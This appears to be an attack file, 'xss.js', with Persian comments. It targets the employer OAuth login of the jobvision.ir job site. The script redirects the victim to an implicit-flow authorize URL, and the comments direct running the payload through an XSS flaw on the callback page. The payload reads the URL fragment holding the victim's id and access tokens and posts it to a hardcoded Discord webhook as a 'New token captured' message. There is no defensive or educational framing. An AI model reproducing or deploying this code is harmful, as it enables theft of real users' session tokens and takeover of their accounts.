<!-- public/xss.js -->
<script>
// وقتی کاربر وارد سایت تو میشه، ابتدا خودش رو به لینک OAuth هدایت کن
window.location.href = "https://account.jobvision.ir/connect/authorize/callback?client_id=EmployerClient&redirect_uri=https%3A%2F%2Femployer.jobvision.ir%2Fauth-callback&response_type=id_token%20token&scope=openid%20profile%20JobVisionApi%20roles%20offline_access%20IdentityServerApi&nonce=ea0db2812bc7e8dea4abeb07564f8b25abR1JLlcG&state=f9e32978a1e163fe8682d9d5ae768e8f1eXA9439a&role=employer";

// --- بعد از اینکه قربانی در صفحه callback هست (آدرس با /auth-callback) ---
// اگر توی همین صفحه یا صفحه دیگه‌ای آسیب‌پذیری XSS داری، اونجا payload زیر رو اجرا کن:

(function(){
  try {
    const data = location.hash || '';
    if(data.length > 0){
      fetch('https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ content: `New token captured: ${data}` })
      }).catch(() => {});
    }
  } catch(e) {}
})();
</script>
